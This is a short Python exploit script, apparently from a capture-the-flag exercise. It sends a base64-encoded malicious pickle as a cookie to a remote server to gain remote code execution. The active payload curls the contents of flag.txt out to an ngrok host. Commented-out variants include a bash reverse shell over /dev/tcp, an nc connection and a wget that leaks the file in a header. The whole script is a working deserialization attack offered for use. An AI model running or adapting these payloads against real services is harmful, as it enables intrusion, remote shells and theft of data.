
# import pickle
# import base64

# class RCE(object):
#     def __init__(self):
#         self.money=10000
#         self.history=[]
        
#     def __reduce__(self):
#         cmd = 'sleep 5'
#         # data = {
#         #     'money':10000,
#         #     'history':[]
#         # }
#         import subprocess
#         return (self.__class__, (subprocess.check_output, (cmd,)))
import requests
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        # cmd = ('4.tcp.ngrok.io:11648')
        cmd = ('curl http://7144-180-251-196-251.ngrok.io/`cut -c1-10 < flag.txt`')
        # cmd = ("bash -c 'bash -i >& /dev/tcp/6.tcp.ngrok.io/12954 0>&1'")
        # cmd = ("nc","6.tcp.ngrok.io","12954")
        # cmd = tuple("wget –header=”EVIL:$(cat flag.txt)”http://7144-180-251-196-251.ngrok.io")
        # cmd = ('sleep 3')
        return os.system, (cmd,)

data = {
    'money':10000,
    'history':[]
}

cookie = {
    'kue':base64.urlsafe_b64encode(pickle.dumps(RCE())).decode()
}
s = requests.session()
print(cookie)
# print(pickle.loads(base64.b64decode(cookie['kue'])))
r = s.get('http://104.43.91.41:10016/',cookies=cookie)
print(r.text)